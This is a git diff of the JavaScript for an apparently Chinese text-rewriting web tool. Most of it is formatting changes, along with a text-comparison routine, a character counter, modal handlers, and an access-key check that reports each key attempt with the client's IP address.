-	if (from.text() !== "修改失败，请稍后重试......" && from.text() !== "" && op === "from") {
-		compareFn(compare, to, from)
-	}
-	if (from1.text() !== "修改失败，请稍后重试......" && from1.text() !== "" && op === "from1") {
-		compareFn(compare1, to, from1)
-	}
-	if (from2.text() !== "修改失败，请稍后重试......" && from2.text() !== "" && op === "from2") {
-		compareFn(compare2, to, from2)
-	}
-	if (from3.text() !== "修改失败，请稍后重试......" && from3.text() !== "" && op === "from3") {
-		compareFn(compare3, to, from3)
-	}
-	if (from4.text() !== "修改失败，请稍后重试......" && from4.text() !== "" && op === "from4") {
-		compareFn(compare4, to, from4)
-	}
-	if (from5.text() !== "修改失败，请稍后重试......" && from5.text() !== "" && op === "from5") {
-		compareFn(compare5, to, from5)
-	}
-}
-
-function compareFn(target, originData, newData) {
-	target.html(eq({
-		value1: newData.text(),
-		value2: originData.val()
-	}).value2)
 }
 
 function eq(op) {
@@ -843,14 +846,14 @@ function eq(op) {
 			if (ps.v1_i >= op.value1.length) {
 				ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
 					/</g, "<").replace(
-						">", ">") + "</del>";
+					">", ">") + "</del>";
 				break;
 			}
 			//值1删除的部分
 			if (ps.v2_i >= op.value2.length) {
 				//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
 				ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i).replace(
-					/</g, "<")
+						/</g, "<")
 					.replace(">", ">") + "</span>";
 				break;
 			}
@@ -917,7 +920,7 @@ function eq(op) {
 				//ps.v1_new_value += "<span style='" + op.value1_style + "'>不同的" + op.value1[ps.v1_i].replace(/</g,"<").replace(">",">") + "</span>";
 				ps.v2_new_value += "<span style='color:green'>" + op.value1[ps.v1_i].replace(/</g,
 					"<").replace(">",
-						">") + "</span>";
+					">") + "</span>";
 				ps.v2_new_value += "<del style='color:red'>" + op.value2[ps.v2_i].replace(/</g, "<")
 					.replace(">",
 						">") + "</del>";
@@ -927,7 +930,7 @@ function eq(op) {
 				if (ps.v1_i >= op.value1.length) {
 					//值2增加的部分
 					ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
-						/</g, "<")
+							/</g, "<")
 						.replace(">", ">") + "</del>";
 					break;
 				}
@@ -943,13 +946,13 @@ function eq(op) {
 			} else if (ps.v1_eq_max > ps.v2_eq_max) {
 				//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1删除的" + op.value1.substr(ps.v1_i, ps.v1_start - ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
 				ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i, ps
-					.v1_start - ps.v1_i)
+						.v1_start - ps.v1_i)
 					.replace(/</g, "<").replace(">", ">") + "</span>";
 				ps.v1_i = ps.v1_start;
 			} else {
 				//值2增加的
 				ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i, ps
-					.v2_start - ps.v2_i)
+						.v2_start - ps.v2_i)
 					.replace(/</g, "<").replace(">", ">") + "</del>";
 				ps.v2_i = ps.v2_start;
 			}
@@ -962,7 +965,7 @@ function eq(op) {
 	var deleteRule = /<span style='color:green'>((?!<span).)+<\/span>/g;
 	var allRule =
 		/(<span style='color:green'>((?!<span).)+<\/span><del style='color:red'>((?!<del).)+<\/del>){2,}/g;
-	op.value2 = op.value2.replace(allRule, function (str) {
+	op.value2 = op.value2.replace(allRule, function(str) {
 		var beforText = "",
 			afterText = "";
 		var beforeMatch = str.match(deleteRule);
@@ -1054,7 +1057,7 @@ function sendRequest(sendTitle, sendContent, sendType) {
 	}, 1500);
 }
 
-$(".originData").on("input", function () {
+$(".originData").on("input", function() {
 	$('#zifu').html(tongji($(this).val()));
 });
 
@@ -1089,7 +1092,7 @@ function tongji(Words) {
 	return iTotal * 2 + (sTotal - iTotal) * 2 + eTotal;
 }
 
-$('#exampleModal').on('shown.bs.modal', function (event) {
+$('#exampleModal').on('shown.bs.modal', function(event) {
 	if (localStorage.getItem('sTimes') != -2 && localStorage.getItem("appid1") == WtdKltf2 && localStorage.getItem("key1") == zDQA3) {
 		localStorage.removeItem('appid1')
 		localStorage.removeItem('key1')
@@ -1097,10 +1100,10 @@ $('#exampleModal').on('shown.bs.modal', function (event) {
 		$("#yourKey").val('');
 	}
 })
-$('#exampleModal').on('hidden.bs.modal', function (event) {
+$('#exampleModal').on('hidden.bs.modal', function(event) {
 	$('body').css("padding-right", "");
 })
-$('#exampleModal1').on('hidden.bs.modal', function (event) {
+$('#exampleModal1').on('hidden.bs.modal', function(event) {
 	$('body').css("padding-right", "");
 })
 
@@ -1151,7 +1154,7 @@ okBtn.click(() => {
 		sckey1 = aMewlv1;
 		if (rscode == sckey1) {
 			if (!cursTimes) {
-				sendRequest(localStorage.getItem("appid1"), "密钥正确，白嫖成功了！" +"IP 地址：" + kehu_ip, 6);
+				sendRequest(localStorage.getItem("appid1"), "密钥正确，白嫖成功了！" + "IP 地址：" + kehu_ip, 6);
 				localStorage.setItem("appid1", WtdKltf2);
 				localStorage.setItem("key1", zDQA3);
 				localStorage.setItem("sTimes", 180000);
@@ -1207,7 +1210,7 @@ okBtn.click(() => {
 			showToast("未输入，提交失败！", 4000);
 		} else {
 			showToast("密钥不正确，请重新获取", 3000);
-			sendRequest(localStorage.getItem("appid1"), "密钥不正确，请重新获取！白嫖失败！" +"IP 地址：" + kehu_ip, 7);
+			sendRequest(localStorage.getItem("appid1"), "密钥不正确，请重新获取！白嫖失败！" + "IP 地址：" + kehu_ip, 7);
 		}
 	}
 	if (timer !== null) {
